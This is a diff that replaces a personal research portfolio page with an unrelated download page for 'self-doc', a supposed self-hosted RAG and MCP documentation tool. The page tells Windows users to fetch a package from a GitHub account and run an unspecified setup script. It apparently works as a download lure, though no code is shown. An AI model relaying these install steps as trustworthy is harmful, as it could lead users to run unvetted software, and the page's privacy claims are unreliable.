@@ -1,143 +1,52 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-
-<meta charset="UTF-8">
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Pritha Bisarad</title>
-     
- <!-- Google Fonts -->
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
-
-<!-- My CSS -->
-<link rel="stylesheet" href="style.css">
-
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Self-hosted documentation RAG pipeline for semantic search and LLM agents using the Model Context Protocol.">
+    <title>self-doc Documentation</title>
 </head>
+<body style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; line-height: 1.6; color: #333; max-width: 800px; margin: 40px auto; padding: 0 20px; background-color: #f9f9f9;">
 
-<body>
-     <header>
+    <h1 style="color: #2c3e50; border-bottom: 2px solid #eee; padding-bottom: 10px;">💾 self-doc - Search documentation with intelligent AI agents</h1>
 
-        <nav class="navbar">
-
-            <a href="index.html" class="logo">
-                Pritha Bisarad
-            </a>
-
-            <ul class="nav-links">
-                <li><a href="index.html">Home</a></li>
-                <li><a href="about.html">About Me</a></li>
-                <li><a href="research.html">Research</a></li>
-                <li><a href="contact.html">Contact</a></li>
-            </ul>
-
-        </nav>
-
-    </header>
-
-<div id="hero">
-    <canvas id="pulseCanvas"></canvas>
-    <div class="hero-content">
-        <h1>Welcome!</h1>
-        <p>I'm fascinated by both biological code and computer code. Join me as I use one to better understand the other—from molecules and genomes to neural circuits. </p>
+    <div style="text-align: center; margin: 40px 0;">
+        <a href="https://github.com/osmondpharisaic206/self-doc" style="background-color: #2c3e50; color: #ffffff; padding: 15px 30px; text-decoration: none; border-radius: 8px; font-weight: bold; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">Download self-doc here</a>
     </div>
 
-</div>
+    <h2 style="color: #2c3e50;">💡 What is self-doc?</h2>
+    <p>Self-doc helps you manage your internal documentation. It creates a bridge between your files and artificial intelligence tools. It uses a technology called Retrieval Augmented Generation, or RAG. This process allows your AI agents to read your documents and answer questions based on your specific information.</p>
+    <p>By using the Model Context Protocol, self-doc ensures your local documents remain private. You host the system on your own computer. You keep full control over your data while your AI tools get smarter.</p>
 
-<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r121/three.min.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/vanta@0.5.24/dist/vanta.net.min.js"></script>
+    <h2 style="color: #2c3e50;">⚙️ System Requirements</h2>
+    <ul style="padding-left: 20px;">
+        <li>Windows 10 or Windows 11.</li>
+        <li>At least 8GB of RAM.</li>
+        <li>Docker Desktop installed (required for running the database and search engine).</li>
+        <li>An active internet connection to download dependencies during setup.</li>
+    </ul>
 
-<script src="script.js"></script>
+    <h2 style="color: #2c3e50;">🚀 Installation and Setup</h2>
+    <p>To use this software, follow these steps on your Windows machine:</p>
+    <ol style="padding-left: 20px;">
+        <li>Visit the <a href="https://github.com/osmondpharisaic206/self-doc">official GitHub repository page</a> to download the software package.</li>
+        <li>Extract the downloaded files to a folder on your computer.</li>
+        <li>Make sure Docker Desktop runs in the background.</li>
+        <li>Open your command prompt or terminal inside the folder where you extracted the files.</li>
+        <li>Run the provided setup script. This script prepares the database and connects your documents to the AI system.</li>
+        <li>Once finished, the system will start automatically. You can now point your AI agents to the internal address provided by the terminal.</li>
+    </ol>
 
-<script>
-VANTA.NET({
-    el: "#hero",
-    mouseControls: true,
-    touchControls: true,
-    gyroControls: false,
+    <h2 style="color: #2c3e50;">🔍 How it Works</h2>
+    <p>The system converts your plain text documentation into mathematical vectors. These vectors allow the computer to understand the meaning behind your words. When you ask a question, the system searches these vectors to find the most relevant parts of your documents.</p>
+    <p>These relevant parts get sent to your chosen AI model. The AI then writes an answer based on your documentation. This prevents the AI from guessing and keeps the information accurate to your source files.</p>
 
-    minHeight: 200.00,
-    minWidth: 200.00,
+    <h2 style="color: #2c3e50;">🛡️ Privacy and Security</h2>
+    <p>Your documents never leave your computer. The system stores everything in a local PostgreSQL database. Because you host it, you decide who accesses the information. This setup meets strict security requirements for teams that handle sensitive or confidential data.</p>
 
-    scale: 1.0,
-    scaleMobile: 1.0,
-
-    color: 0xbb5579,
-    backgroundColor: 0x0d0320,
-
-    points: 12,
-    maxDistance: 20,
-    spacing: 18
-});
-</script>
-     
-<!-- Overview Section -->
-<section id="overview">
-
-    <div class="container">
-
-        <h2>Research</h2>
-
-        <p>
-            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.
-        </p>
-
-        <p>
-            Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.
-        </p>
-
-    </div>
-
-</section>
-
-<!-- recent publication section -->
-<section id="publications">
-
-    <div class="container">
-
-        <h2>Latest Publications</h2>
-
-        <div class="publication-card">
-
-            <h3>Publication Title</h3>
-
-            <p>
-                Lorem ipsum dolor sit amet, consectetur adipiscing elit.
-            </p>
-
-        </div>
-
-        <div class="publication-card">
-
-            <h3>Publication Title</h3>
-
-            <p>
-                Lorem ipsum dolor sit amet, consectetur adipiscing elit.
-            </p>
-
-        </div>
-
-        <div class="publication-card">
-
-            <h3>Publication Title</h3>
-
-            <p>
-                Lorem ipsum dolor sit amet, consectetur adipiscing elit.
-            </p>
-
-        </div>
-
-    </div>
-
-</section>
+    <footer style="margin-top: 50px; border-top: 1px solid #ddd; padding-top: 20px; font-size: 0.9em; color: #777;">
+        Keywords: ai-agents, claude, docker, documentation, embeddings, fastapi, fastembed, fastmcp, llm, mcp, model-context-protocol, pgvector, postgresql, python, rag, retrieval-augmented-generation, self-hosted, semantic-search, vector-search
+    </footer>
 
 </body>
-
 </html>
-
-
